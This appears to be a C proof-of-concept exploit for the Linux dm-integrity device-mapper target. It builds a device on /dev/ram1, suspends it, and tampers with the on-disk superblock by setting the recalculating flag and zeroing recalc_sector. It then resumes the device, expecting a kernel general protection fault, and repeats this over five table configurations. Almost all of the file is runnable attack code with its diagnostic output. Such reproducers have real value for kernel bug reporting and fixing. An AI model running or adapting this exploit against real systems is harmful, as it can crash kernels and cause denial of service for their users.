#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <linux/dm-ioctl.h>

#define DEV "dmgap0"
#define BACKDEV "/dev/ram1"
#define SB_SECTORS 8
#define SB_BUF (SB_SECTORS * 512)

struct dm_sb {
	unsigned char magic[8];
	unsigned char version;
	unsigned char log2_interleave_sectors;
	unsigned short integrity_tag_size;
	unsigned int journal_sections;
	unsigned long long provided_data_sectors;
	unsigned int flags;
	unsigned char log2_sectors_per_block;
	unsigned char log2_blocks_per_bitmap_bit;
	unsigned char pad[2];
	unsigned long long recalc_sector;
	unsigned char pad2[8];
	unsigned char salt[16];
};

static int ctl_fd = -1;

static int dm_ioctl(int cmd, struct dm_ioctl *dmi, size_t len)
{
	int r;
	dmi->version[0] = 4;
	dmi->version[1] = 0;
	dmi->version[2] = 0;
	dmi->data_size = len;
	dmi->data_start = sizeof(struct dm_ioctl);
	r = ioctl(ctl_fd, cmd, dmi);
	if (r < 0)
		return -errno;
	return 0;
}

static int dm_ctl(int cmd, const char *name)
{
	static char buf[4096];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	if (cmd == DM_DEV_CREATE)
		dmi->flags = DM_PERSISTENT_DEV_FLAG;
	return dm_ioctl(cmd, dmi, sizeof(buf));
}

static int dm_load(const char *name, unsigned long long start,
		   unsigned long long len, const char *spec)
{
	static char buf[8192];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;
	struct dm_target_spec *s;
	char *p;
	size_t sl;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	dmi->target_count = 1;

	s = (struct dm_target_spec *)(buf + sizeof(struct dm_ioctl));
	s->sector_start = start;
	s->length = len;
	snprintf(s->target_type, sizeof(s->target_type), "integrity");

	p = (char *)s + sizeof(struct dm_target_spec);
	strcpy(p, spec);
	sl = sizeof(struct dm_target_spec) + strlen(spec) + 1;
	sl = (sl + 7) & ~7UL;

	return dm_ioctl(DM_TABLE_LOAD, dmi, sizeof(struct dm_ioctl) + sl);
}

static int dm_suspend(const char *name, int do_suspend)
{
	static char buf[4096];
	struct dm_ioctl *dmi = (struct dm_ioctl *)buf;

	memset(buf, 0, sizeof(buf));
	snprintf(dmi->name, sizeof(dmi->name), "%s", name);
	dmi->flags = do_suspend ? DM_SUSPEND_FLAG : 0;
	return dm_ioctl(DM_DEV_SUSPEND, dmi, sizeof(buf));
}

static void st(const char *tag, int rc)
{
	printf("%-44s rc=%d errno=%d\n", tag, rc, rc ? errno : 0);
	fflush(stdout);
}

static void dm_dmesg(const char *pat)
{
	char cmd[256];
	snprintf(cmd, sizeof(cmd),
		 "dmesg | grep -iE '%s' | tail -4 | sed 's/^/    /'", pat);
	fflush(stdout);
	if (system(cmd) < 0)
		printf("    (dmesg n/a)\n");
	fflush(stdout);
}

static int read_sb(unsigned long long sb_off, unsigned char *out)
{
	int fd, n;
	fd = open(BACKDEV, O_RDONLY);
	if (fd < 0) {
		printf("  open %s ro failed errno=%d\n", BACKDEV, errno);
		return -1;
	}
	if (lseek(fd, (off_t)sb_off, SEEK_SET) < 0) {
		printf("  seek failed errno=%d\n", errno);
		close(fd);
		return -1;
	}
	n = read(fd, out, SB_BUF);
	close(fd);
	if (n != SB_BUF) {
		printf("  read sb got %d (want %d) errno=%d\n", n, SB_BUF, errno);
		return -1;
	}
	return 0;
}

static int write_sb(unsigned long long sb_off, const unsigned char *in)
{
	int fd, n;
	fd = open(BACKDEV, O_RDWR);
	if (fd < 0) {
		printf("  open %s rw failed errno=%d\n", BACKDEV, errno);
		return -1;
	}
	if (lseek(fd, (off_t)sb_off, SEEK_SET) < 0) {
		printf("  seek failed errno=%d\n", errno);
		close(fd);
		return -1;
	}
	n = write(fd, in, SB_BUF);
	fsync(fd);
	close(fd);
	if (n != SB_BUF) {
		printf("  write sb got %d (want %d) errno=%d\n", n, SB_BUF, errno);
		return -1;
	}
	return 0;
}

static void dump_sb(const struct dm_sb *sb)
{
	char m[9];
	memcpy(m, sb->magic, 8);
	m[8] = 0;
	printf("    magic=[%s] version=%u interleave_log2=%u tag=%u\n",
	       m, sb->version, sb->log2_interleave_sectors,
	       sb->integrity_tag_size);
	printf("    journal_sections=%u provided_data_sectors=%llu\n",
	       sb->journal_sections, sb->provided_data_sectors);
	printf("    flags=0x%x log2_spb=%u log2_bpbb=%u recalc_sector=%llu\n",
	       sb->flags, sb->log2_sectors_per_block,
	       sb->log2_blocks_per_bitmap_bit, sb->recalc_sector);
	fflush(stdout);
}

static int try_attack(const char *spec, unsigned long long start)
{
	unsigned char buf[SB_BUF];
	struct dm_sb *sb = (struct dm_sb *)buf;
	unsigned long long sb_off = start * 512;
	int rc;

	printf("\n=== ATTEMPT: spec=\"%s\" start=%llu ===\n", spec, start);
	fflush(stdout);

	dm_ctl(DM_DEV_REMOVE, DEV);
	rc = dm_ctl(DM_DEV_CREATE, DEV);
	st("DM_DEV_CREATE", rc);

	rc = dm_load(DEV, 0, 8192, spec);
	st("DM_TABLE_LOAD (mode J, no hash)", rc);
	if (rc) {
		dm_dmesg("integrity|device-mapper");
		dm_ctl(DM_DEV_REMOVE, DEV);
		return -1;
	}

	rc = dm_suspend(DEV, 0);
	st("resume #1 (constructor state into sb)", rc);
	if (rc) {
		dm_dmesg("integrity|device-mapper");
		dm_ctl(DM_DEV_REMOVE, DEV);
		return -1;
	}

	rc = dm_suspend(DEV, 1);
	st("suspend", rc);

	if (read_sb(sb_off, buf) != 0) {
		dm_ctl(DM_DEV_REMOVE, DEV);
		return -1;
	}
	printf("  --- sb on device (before tamper) ---\n");
	dump_sb(sb);

	if (memcmp(sb->magic, "integrt", 7) != 0) {
		printf("  sb magic mismatch, cannot attack\n");
		dm_suspend(DEV, 0);
		dm_ctl(DM_DEV_REMOVE, DEV);
		return -1;
	}

	sb->flags |= 2;
	sb->recalc_sector = 0;

	printf("  --- sb after tamper (RECALCULATING set) ---\n");
	dump_sb(sb);
	fflush(stdout);

	if (write_sb(sb_off, buf) != 0) {
		dm_ctl(DM_DEV_REMOVE, DEV);
		return -1;
	}
	st("tampered sb written", 0);

	printf("  >>> RESUME NOW (expect GPF in dm_integrity_resume) <<<\n");
	fflush(stdout);

	rc = dm_suspend(DEV, 0);
	st("resume #2", rc);

	printf("  --- survived, no crash? ---\n");
	dm_dmesg("integrity|device-mapper|general protection|qpuhp");

	dm_ctl(DM_DEV_REMOVE, DEV);
	return 0;
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== DM-INTEGRITY RECALC_WQ NULL POC ===\n");
	printf("=== attack: tamper on-disk sb while suspended ===\n");

	ctl_fd = open("/dev/mapper/control", O_RDWR);
	if (ctl_fd < 0) {
		printf("open control failed errno=%d\n", errno);
		return 1;
	}
	printf("control fd=%d\n", ctl_fd);

	try_attack("/dev/ram1 8 4 J 1 journal_sectors:8", 8);
	try_attack("/dev/ram1 0 4 J 1 journal_sectors:8", 0);
	try_attack("/dev/ram1 16 4 J 2 journal_sectors:8 buffer_sectors:1", 16);
	try_attack("/dev/ram1 8 8 J 1 journal_sectors:8", 8);
	try_attack("/dev/ram1 8 4 D 0", 8);

	printf("\n=== POC DONE ===\n");
	close(ctl_fd);
	return 0;
}